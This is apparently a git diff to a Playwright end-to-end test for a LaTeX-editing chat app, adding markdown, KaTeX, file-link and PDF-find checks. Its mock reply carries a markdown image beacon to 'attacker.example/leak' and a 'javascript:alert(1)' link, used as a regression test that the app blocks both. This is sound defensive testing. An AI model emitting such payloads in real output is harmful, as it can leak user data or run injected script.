@@ -52,6 +52,44 @@ const REFS_BIB = `@inproceedings{vaswani2017attention,
 `;
 
 /**
+ * Markdown/math payload the ask-mock appends to its answered echo so the
+ * markdown pipeline (react-markdown + remark-math + KaTeX) can be asserted
+ * end to end: bold, inline and display math, a fence keeping its literal $,
+ * a lone currency dollar that must stay plain text — plus the hardening and
+ * project-link cases: a remote image and a javascript: link that must never
+ * fetch/navigate (F1), an unpaired \[ lookalike (F2), an indented code block
+ * (F3), display math on a list item's continuation line (F4), and
+ * file-mention links plus a locatable blockquote (job B).
+ */
+const MD_ECHO = [
+  "Rendering check: **bold text** plus inline math $d(v)$ and $h^{(t)}(v)$.",
+  "",
+  "$$\\int_0^1 x\\,dx$$",
+  "",
+  "```",
+  "code keeps its literal $x$ and **markers**",
+  "```",
+  "",
+  "this costs $5 in total",
+  "",
+  "![x](https://attacker.example/leak?d=1) and a [boom](javascript:alert(1)) link.",
+  "",
+  "Use \\\\[4pt] for spacing.",
+  "",
+  "\\[x=1\\]",
+  "",
+  "    indented code keeps \\(x\\) raw",
+  "",
+  "- first bullet",
+  "  $$E=mc^2$$",
+  "- second bullet",
+  "",
+  "See `main.tex:3` and nonexistent.tex:9 for context.",
+  "",
+  "> Attention mechanisms let a model weigh context dynamically",
+].join("\n");
+
+/**
  * Minimal OpenAI-compatible SSE endpoint for the AskUserQuestion e2e (W9):
  * each turn's first completion request streams an ask_user tool call (turn 1
  * asks about the section, turn 2 about the abstract, so the two cards are
@@ -134,7 +172,7 @@ function startAskMock(port: number): Promise<{ close: () => Promise<void> }> {
               delta: {
                 content: declined
                   ? "You skipped the question — proceeding with my best judgment."
-                  : `Understood — I will focus on the ${chosen} as requested.`,
+                  : `Understood — I will focus on the ${chosen} as requested.\n\n${MD_ECHO}`,
               },
             },
           ],
@@ -206,6 +244,12 @@ async function main() {
     browser = await chromium.launch({ executablePath: EXECUTABLE, headless: true });
     const page = await browser.newPage({ viewport: { width: 1500, height: 920 } });
     page.on("download", () => downloads++);
+    // F1 regression net: rendering untrusted chat content must never issue a
+    // request to the attacker host embedded in MD_ECHO's image markdown.
+    const attackerRequests: string[] = [];
+    page.on("request", (r) => {
+      if (r.url().includes("attacker.example")) attackerRequests.push(r.url());
+    });
     page.on("console", (msg) => {
       if (msg.type() === "error") console.log("  [console.error]", msg.text());
     });
@@ -372,6 +416,12 @@ async function main() {
     const projDefaultModeApplied = await page
       .getByRole("button", { name: "Research", exact: true })
       .evaluate((el) => el.className.includes("bg-leaf/10"));
+    // The composer's mode picker offers the read-only Understand mode.
+    const understandPillOk =
+      (await page
+        .getByRole("button", { name: "Understand", exact: true })
+        .filter({ visible: true })
+        .count()) === 1;
     await shot("23g-project-override-chip");
 
     // Clear the override from the chip popover; style + default mode must survive.
@@ -411,7 +461,7 @@ async function main() {
     });
     chatsMod.appendEvent(mockProjectId, injectChatId, {
       type: "text_final",
-      text: "Persisted reply from an earlier session.",
+      text: "Persisted reply from an earlier session. Math survives too: $a^2+b^2=c^2$.",
     });
     chatsMod.appendEvent(mockProjectId, injectChatId, {
       type: "tool_use",
@@ -426,6 +476,19 @@ async function main() {
       fileDiff:
         "diff --git a/main.tex b/main.tex\n--- a/main.tex\n+++ b/main.tex\n" +
         "@@ -1 +1 @@\n-old ui-verify line\n+new ui-verify line\n",
+    });
+    // A read-only tool with its persisted one-line result summary.
+    chatsMod.appendEvent(mockProjectId, injectChatId, {
+      type: "tool_use",
+      id: "tu-verify-2",
+      name: "Grep",
+      detail: "attention",
+    });
+    chatsMod.appendEvent(mockProjectId, injectChatId, {
+      type: "tool_result",
+      id: "tu-verify-2",
+      isError: false,
+      resultHead: "main.tex:8 — Attention mechanisms (2 lines)",
     });
     chatsMod.appendEvent(mockProjectId, injectChatId, {
       type: "turn_end",
@@ -452,6 +515,17 @@ async function main() {
     const restoreDiffOk =
       (await page.getByText("new ui-verify line").filter({ visible: true }).count()) > 0;
     const restoreTurnEndOk = (await page.getByText("turn complete").count()) > 0;
+    // The restored agent bubble renders its math through KaTeX (no raw "$…$")…
+    const restoreMathOk =
+      (await leftPane().locator(".prose-agent .katex").filter({ visible: true }).count()) > 0 &&
+      (await leftPane().getByText("$a^2+b^2=c^2$").filter({ visible: true }).count()) === 0;
+    // …and the read-only tool chip shows its persisted one-line result summary.
+    const restoreResultHeadOk =
+      (await page
+        .getByText("main.tex:8 — Attention mechanisms (2 lines)")
+        .filter({ visible: true })
+        .count()) > 0 &&
+      (await page.getByText("Searching", { exact: true }).filter({ visible: true }).count()) > 0;
     await shot("23d-chat-restored");
 
     // ---- Deleting the active chat (confirm pattern) falls back to the other one ----
@@ -1032,6 +1106,144 @@ async function main() {
       (await askQuestionText().count()) > 0;
     await shot("30d-question-answered");
 
+    // ---- Markdown + math: the echoed reply carries MD_ECHO — assert the
+    // rendered DOM, not the source: KaTeX output (inline AND display), a real
+    // <strong>, raw markers invisible outside code, the fence byte-literal,
+    // and the lone currency dollar left untouched by remark-math.
+    const mdStrongOk =
+      (await leftPane()
+        .locator(".prose-agent strong", { hasText: "bold text" })
+        .filter({ visible: true })
+        .count()) > 0;
+    const mdMath = await leftPane().evaluate((root) => {
+      const all = [...root.querySelectorAll(".prose-agent .katex")];
+      return {
+        inline: all.filter((k) => !k.closest(".katex-display")).length,
+        display: root.querySelectorAll(".prose-agent .katex-display").length,
+      };
+    });
+    const mdInlineMathOk = mdMath.inline >= 2;
+    const mdDisplayMathOk = mdMath.display >= 1;
+    const mdNoRawOk =
+      (await leftPane().getByText("$d(v)$").filter({ visible: true }).count()) === 0 &&
+      (await leftPane().getByText("**bold text**").filter({ visible: true }).count()) === 0;
+    const mdCodeLiteralOk =
+      (await leftPane()
+        .getByText("code keeps its literal $x$ and **markers**")
+        .filter({ visible: true })
+        .count()) > 0;
+    const mdCurrencyOk =
+      (await leftPane().getByText("this costs $5 in total").filter({ visible: true }).count()) > 0;
+    await shot("30d2-markdown-math");
+
+    // ---- F1 regression: the echoed reply carries a remote image and a
+    // javascript: link — the image must render as an inert alt+host chip
+    // (no <img>, no preload hint, no network request), the link no href.
+    const f1NoImgOk =
+      (await page.locator('img[src^="http"]').count()) === 0 &&
+      (await page.locator('link[rel="preload"][as="image"]').count()) === 0;
+    const f1ChipOk =
+      (await leftPane()
+        .locator(".md-img-chip", { hasText: "attacker.example" })
+        .filter({ visible: true })
+        .count()) > 0;
+    const f1JsLinkOk =
+      (await page.locator('a[href^="javascript"]').count()) === 0 &&
+      (await leftPane().getByText("boom").filter({ visible: true }).count()) > 0;
+    const f1NoRequestOk = attackerRequests.length === 0;
+
+    // ---- F2: the unpaired \[ lookalike stays literal prose while the real
+    // \[x=1\] line renders as display math. F3: the indented code block keeps
+    // its literal \(x\). F4: ONE list survives around its display equation.
+    const f2PreservedOk =
+      (await leftPane().getByText("\\[4pt] for spacing").filter({ visible: true }).count()) > 0 &&
+      (await leftPane().getByText("$$4pt]").count()) === 0;
+    const f2DisplayOk = await leftPane().evaluate((root) =>
+      [...root.querySelectorAll(".prose-agent .katex-display annotation")].some((a) =>
+        (a.textContent ?? "").includes("x=1"),
+      ),
+    );
+    const f3IndentedOk =
+      (await leftPane()
+        .getByText("indented code keeps \\(x\\) raw")
+        .filter({ visible: true })
+        .count()) > 0;
+    const f4List = await leftPane().evaluate((root) => {
+      const uls = [...root.querySelectorAll(".prose-agent ul")].filter((ul) =>
+        (ul.textContent ?? "").includes("first bullet"),
+      );
+      return {
+        count: uls.length,
+        both: uls.some((ul) => (ul.textContent ?? "").includes("second bullet")),
+        display: uls.some((ul) => ul.querySelector(".katex-display") !== null),
+      };
+    });
+    const f4ListOk = f4List.count === 1 && f4List.both && f4List.display;
+    // (F5 — the empty-box flash while a display equation streams — is timing-
+    // dependent and not deterministically assertable in this end-to-end flow;
+    // it is pinned by the unit tests in test/markdown.test.tsx instead.)
+    await shot("30d3-chat-hardening");
+
+    // ---- Job B: `main.tex:3` (an existing file, inside a code span) links
+    // into the Source pane and flashes the line; nonexistent.tex:9 stays
+    // plain; the blockquote's "find in source" locates the quoted passage.
+    const fileLink = leftPane().locator("a.md-file-link", { hasText: "main.tex:3" });
+    const linkRenderedOk =
+      (await fileLink.count()) > 0 &&
+      (await leftPane().locator("code a.md-file-link", { hasText: "main.tex:3" }).count()) > 0;
+    const plainNonexistentOk =
+      (await leftPane().getByText("nonexistent.tex:9").filter({ visible: true }).count()) > 0 &&
+      (await leftPane().locator("a", { hasText: "nonexistent.tex" }).count()) === 0;
+    await fileLink.first().click();
+    await aside().locator(".cm-flash-line").first().waitFor({ timeout: 10_000 });
+    const linkJumpOk =
+      (await aside()
+        .getByRole("tab", { name: "Source", exact: true })
+        .evaluate((el) => el.className.includes("bg-ink-2"))) &&
+      (await aside().getByText("Ln 3, Col 1").count()) > 0;
+    await shot("30d4-file-link-jump");
+    // The flash decoration clears itself — wait so the next jump gets a fresh one.
+    await aside().locator(".cm-flash-line").waitFor({ state: "detached", timeout: 5_000 });
+
+    const findSourceBtn = leftPane().getByRole("button", { name: "find in source" });
+    const quoteActionOk = (await findSourceBtn.count()) > 0;
+    // No PDF pane is visible right now — the PDF action must not be offered.
+    const noPdfActionOk =
+      (await leftPane().getByRole("button", { name: "find in PDF" }).count()) === 0;
+    await findSourceBtn.first().click();
+    await aside().locator(".cm-flash-line").first().waitFor({ timeout: 10_000 });
+    // The quoted sentence lives on main.tex line 8.
+    const quoteJumpOk = (await aside().getByText("Ln 8, Col 1").count()) > 0;
+    await shot("30d5-quote-find-source");
+
+    // ---- Job B: with a PDF pane visible the same blockquote also offers
+    // "find in PDF", which highlights the passage in the rendered text layer.
+    await aside().getByRole("tab", { name: "PDF", exact: true }).click();
+    await aside().locator("canvas").first().waitFor({ state: "visible", timeout: 120_000 });
+    // Showing the PDF auto-recompiles (the turn dirtied the tree) — wait for
+    // the indicator to appear (tolerated if it never does) and clear, then
+    // let the reloaded document settle so the find runs on stable pages.
+    await page
+      .getByText(/Compiling…/)
+      .filter({ visible: true })
+      .first()
+      .waitFor({ timeout: 5_000 })
+      .catch(() => {});
+    await page.waitForFunction(() => !document.body.innerText.includes("Compiling…"), {
+      timeout: 180_000,
+    });
+    await page.waitForTimeout(1_000);
+    await aside().locator(".textLayer span").first().waitFor({ timeout: 60_000 });
+    const findPdfBtn = leftPane().getByRole("button", { name: "find in PDF" });
+    await findPdfBtn.first().waitFor({ timeout: 10_000 });
+    await findPdfBtn.first().click();
+    await aside().locator(".textLayer span.pdf-find-flash").first().waitFor({ timeout: 15_000 });
+    const pdfFindOk = (await aside().locator(".textLayer span.pdf-find-flash").count()) > 0;
+    await shot("30d6-quote-find-pdf");
+    // Restore the layout the rest of the flow expects (right pane on Source).
+    await aside().getByRole("tab", { name: "Source", exact: true }).click();
+    await aside().locator(".cm-content").first().waitFor({ state: "visible", timeout: 15_000 });
+
     // ---- Skip path: the second turn asks again; the user skips — the
     // declined tool result must reach the model (the mock echoes it) and the
     // card must collapse to its muted "skipped" summary.
@@ -1302,11 +1514,14 @@ async function main() {
         projSettingsSavedOk,
         projChipOverrideOk,
         projDefaultModeApplied,
+        understandPillOk,
         projClearOk,
         restoreUserOk,
         restoreTitleOk,
         restoreDiffOk,
         restoreTurnEndOk,
+        restoreMathOk,
+        restoreResultHeadOk,
         deleteChatOk,
         sourceOk,
         cmGoldTokens,
@@ -1335,6 +1550,29 @@ async function main() {
         askCollapsedOk,
         askSkipEchoOk,
         askSkippedCollapsedOk,
+        mdStrongOk,
+        mdMath,
+        mdInlineMathOk,
+        mdDisplayMathOk,
+        mdNoRawOk,
+        mdCodeLiteralOk,
+        mdCurrencyOk,
+        f1NoImgOk,
+        f1ChipOk,
+        f1JsLinkOk,
+        f1NoRequestOk,
+        f2PreservedOk,
+        f2DisplayOk,
+        f3IndentedOk,
+        f4List,
+        f4ListOk,
+        linkRenderedOk,
+        plainNonexistentOk,
+        linkJumpOk,
+        quoteActionOk,
+        noPdfActionOk,
+        quoteJumpOk,
+        pdfFindOk,
         compilingSeen,
         canvasesDuringCompile,
         compilingCleared,
@@ -1402,6 +1640,9 @@ async function main() {
     if (!projDefaultModeApplied) {
       throw new Error("the project's default mode did not preselect the Research pill");
     }
+    if (!understandPillOk) {
+      throw new Error("the chat composer's mode picker does not show the Understand pill");
+    }
     if (!projClearOk) {
       throw new Error("clearing the project override failed (or dropped the style/defaultMode)");
     }
@@ -1409,6 +1650,12 @@ async function main() {
     if (!restoreTitleOk) throw new Error("chat title was not derived from the first user message");
     if (!restoreDiffOk) throw new Error("restored tool chip did not expand to the persisted fileDiff");
     if (!restoreTurnEndOk) throw new Error("persisted turn_end marker did not render after reload");
+    if (!restoreMathOk) {
+      throw new Error("the restored transcript did not render its inline math through KaTeX");
+    }
+    if (!restoreResultHeadOk) {
+      throw new Error("the restored Grep chip did not show its persisted resultHead sub-line");
+    }
     if (!deleteChatOk) throw new Error("deleting the active chat did not fall back to the remaining one");
     if (!sourceOk) throw new Error("Source tab did not show the expected file content");
     if (cmGoldTokens < 1) throw new Error("CodeMirror showed no highlighted (gold) LaTeX command tokens while editing");
@@ -1475,6 +1722,49 @@ async function main() {
     if (!askSkippedCollapsedOk) {
       throw new Error("the skipped question card did not collapse to its muted 'skipped' summary");
     }
+    if (!mdStrongOk) throw new Error("markdown **bold** did not render as a <strong> element");
+    if (!mdInlineMathOk) {
+      throw new Error(`inline $…$ math did not render through KaTeX (inline count ${mdMath.inline})`);
+    }
+    if (!mdDisplayMathOk) {
+      throw new Error(`display $$…$$ math did not render through KaTeX (display count ${mdMath.display})`);
+    }
+    if (!mdNoRawOk) {
+      throw new Error("raw '$d(v)$' or '**bold text**' markers stayed visible outside code");
+    }
+    if (!mdCodeLiteralOk) {
+      throw new Error("the fenced code block lost its literal $x$/** markers");
+    }
+    if (!mdCurrencyOk) {
+      throw new Error("'this costs $5 in total' was not left as plain text by remark-math");
+    }
+    if (!f1NoImgOk) {
+      throw new Error("a remote image rendered as a fetching element (img[src^=http] or a preload hint)");
+    }
+    if (!f1ChipOk) throw new Error("the blocked remote image did not render its alt+host chip");
+    if (!f1JsLinkOk) throw new Error("a javascript: link kept its href (or the link text vanished)");
+    if (!f1NoRequestOk) {
+      throw new Error(`the chat issued network requests to attacker.example: ${attackerRequests.join(", ")}`);
+    }
+    if (!f2PreservedOk) throw new Error("the unpaired \\[4pt] lookalike swallowed prose around it");
+    if (!f2DisplayOk) throw new Error("the real \\[x=1\\] line did not render as display math");
+    if (!f3IndentedOk) throw new Error("the indented code block lost its literal \\(x\\)");
+    if (!f4ListOk) {
+      throw new Error("the $$…$$ line inside a list item split the list (or dropped its display math)");
+    }
+    if (!linkRenderedOk) {
+      throw new Error("`main.tex:3` did not render as a file link inside its code span");
+    }
+    if (!plainNonexistentOk) throw new Error("nonexistent.tex:9 did not stay plain text");
+    if (!linkJumpOk) {
+      throw new Error("clicking the main.tex:3 link did not reveal+flash line 3 in the Source pane");
+    }
+    if (!quoteActionOk) throw new Error("the assistant blockquote shows no 'find in source' action");
+    if (!noPdfActionOk) throw new Error("'find in PDF' was offered while no PDF pane was visible");
+    if (!quoteJumpOk) {
+      throw new Error("'find in source' did not reveal the quoted passage (main.tex line 8)");
+    }
+    if (!pdfFindOk) throw new Error("'find in PDF' did not highlight the passage in the PDF text layer");
     if (canvases < 1) throw new Error("PDF viewer rendered no pages");
     if (downloads > 0) throw new Error("PDF triggered a browser download — must render inline");
     if (Math.abs(widthAfter - widthBefore) < 100) throw new Error("panel resize had no effect");
